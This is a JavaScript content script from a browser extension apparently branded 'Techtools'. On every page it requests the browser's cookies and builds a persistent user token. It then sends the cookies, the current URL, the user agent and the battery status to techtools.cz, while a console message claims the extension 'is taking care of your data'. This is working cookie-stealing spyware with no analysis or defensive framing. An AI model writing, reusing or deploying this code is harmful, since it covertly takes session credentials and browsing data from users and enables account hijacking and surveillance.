// Function to generate a unique token
function generateToken() {
  return 'user_' + Math.random().toString(36).substr(2) + Date.now().toString(36);
}

// Battery Status API
function getBatteryInfo() {
  // Return the promise that resolves with the battery info
  return navigator.getBattery?.().then(battery => {
    return {
      batteryLevel: `${battery.level * 100}%`,
      isCharging: battery.charging
    };
  });
}


chrome.runtime.sendMessage({action: "getCookies"}, function(response) {
  console.log('Techtools is taking care of your data!');

  // Check for an existing token
  chrome.storage.local.get(['userToken'], function(result) {
    let userToken = result.userToken || generateToken();
    const currentUrl = window.location.href;

    if (!result.userToken) {
      // If token doesn't exist, generate and save a new one
      chrome.storage.local.set({userToken: userToken}, function() {
        console.log("New token generated and saved.");
      });
    }

    // Fetch battery info and proceed with sending the data
    getBatteryInfo().then(batteryInfo => {
      // Use batteryInfo here
      fetch('https://techtools.cz/extension/receiver', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          "data": response.cookies,
          "token_identifier": userToken,
          "url_send_from": currentUrl,
          "user_agent": navigator.userAgent,
          "battery_info": batteryInfo // Use the obtained battery info here
        })
      })
      .then(response => {
        if (!response.ok) throw new Error('Network response was not ok');
        return response.json();
      })
      .then(data => console.log(data))
      .catch(error => console.error('Error:', error));
    });
  });
});